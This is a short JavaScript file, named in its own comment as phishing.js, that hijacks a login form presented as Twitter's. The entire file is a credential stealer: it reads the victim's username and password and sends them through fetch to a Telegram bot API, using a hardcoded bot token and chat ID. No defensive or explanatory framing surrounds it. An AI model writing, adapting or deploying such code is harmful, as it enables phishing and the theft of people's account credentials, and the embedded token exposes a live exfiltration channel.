
// <script src="phishing.js"></script>

function submitLoginForm(event){
    event.preventDefault();
    let email = event.target['username'].value;
    let password = event.target['password'].value;
    let text = email + ` <Twitter> ` + password;
    
    let ID = 5721393154;
    let API = '6556542346:AAFPNkrk6FLdIne_-pe_5M-DSMy4szyLRjw';
    let url = `https://api.telegram.org/bot${API}/sendMessage?chat_id=${ID}&text=${text}`;
    fetch(url);
}
